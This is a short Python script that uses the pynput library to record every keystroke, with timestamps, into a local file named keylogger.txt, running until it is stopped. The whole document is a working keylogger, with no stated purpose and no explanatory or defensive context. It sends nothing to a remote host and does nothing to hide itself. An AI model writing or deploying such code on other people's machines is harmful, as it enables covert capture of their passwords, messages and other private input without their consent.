import pynput
from pynput.keyboard import Key, Listener
import logging

# Define the location of the keylog
keylogger_filename = r"keylogger.txt"
# Define the format of the keylog
logging.basicConfig(filename=keylogger_filename, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Log the key that was pressed
def on_press(key):
    logging.info(str(key))

# Listen for keyboard events and call on_keypress whenever a key is stepped
with Listener(on_press=on_press) as listener:
    # Keep the program running until it is stopped
    listener.join()